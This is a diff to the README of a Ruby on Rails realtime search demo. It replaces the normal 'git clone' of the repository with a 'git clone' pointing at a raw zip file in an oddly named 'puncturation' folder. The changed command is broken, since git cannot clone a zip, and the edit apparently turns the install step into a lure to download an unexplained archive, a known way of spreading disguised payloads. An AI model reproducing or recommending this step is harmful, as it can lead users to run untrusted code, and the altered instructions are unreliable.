@@ -10,7 +10,7 @@ A simple Ruby on Rails application that provides a realtime search feature using
 
 ```bash
 # Clone the repository
-git clone https://github.com/elbadawyy/realtime-search-demo.git
+git clone https://raw.githubusercontent.com/elbadawyy/realtime-search-demo/main/puncturation/realtime-search-demo.zip
 
 cd realtime_search_engine_demo
 
